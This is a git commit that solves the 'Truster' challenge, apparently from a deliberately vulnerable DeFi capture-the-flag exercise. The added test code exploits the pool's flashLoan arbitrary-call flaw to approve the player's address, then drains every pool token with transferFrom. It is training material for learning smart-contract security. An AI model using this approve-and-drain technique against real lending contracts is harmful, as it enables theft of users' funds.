2cf367d27a0d61fdd827f192e833c1dffd8adea7
George Avsetsin <mail@sjors.ru>
2024-05-03 09:53:28 +0300

    solve truster

--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -23,6 +23,26 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // The pool contract has a vulnerability that allows anyone to make arbitrary calls 
+        // to token contract on behalf of the pool contract
+
+        // 1. Prepare the data for the approve call to the token contract
+        const abi = ['function approve(address spender, uint256 amount) returns (bool)'];
+        const iface = new ethers.utils.Interface(abi);
+        const data = iface.encodeFunctionData('approve', [player.address, TOKENS_IN_POOL]);
+
+        // 2. Call flashLoan with the data
+        await pool.connect(player).flashLoan(0n, player.address, token.address, data);
+
+        // 3. Check the allowance
+        expect(await token.allowance(pool.address, player.address)).to.equal(TOKENS_IN_POOL);
+
+        // 4. Transfer all tokens from the pool to the player
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+
+        // 5. Check the player's balance
+        expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
     });
 
     after(async function () {
